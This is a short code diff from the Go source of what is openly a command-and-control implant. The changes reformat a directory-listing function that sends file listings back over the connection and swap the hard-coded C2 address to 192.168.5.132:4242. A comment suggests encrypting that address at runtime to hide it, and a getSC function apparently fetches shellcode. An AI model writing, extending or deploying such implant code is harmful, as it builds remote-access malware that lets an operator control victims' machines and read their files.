@@ -117,11 +117,10 @@ func ls(conn *net.Conn, implantWD *string) {
 	dirListing := ""
 	for e := range dirFS {
 		dirInfo, _ := dirFS[e].Info()
-		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "	" + dirInfo.Name() + "\n"
+		KBSizeOfDir := dirInfo.Size() / 1000
+		dirListing = dirListing + "	" + fmt.Sprint(KBSizeOfDir) + "	 		" + fmt.Sprint(dirInfo.Mode()) + "	 	" + dirInfo.Name() + "\n"
 	}
-	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
-		"		----		" + "----		" + "	----" + "\n" +
-		dirListing + "\n")) //Looks funky but I want it organized. Write this server side later.
+	(*conn).Write([]byte(dirListing))
 }
 
 func getSC(conn *net.Conn) ([]byte, int) {
@@ -156,7 +155,7 @@ func getSC(conn *net.Conn) ([]byte, int) {
 }
 
 func main() {
-	c2Address := "192.168.0.106:6969" //Have it encrypted or anything and decode it during runtime
+	c2Address := "192.168.5.132:4242" //Have it encrypted or anything and decode it during runtime
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
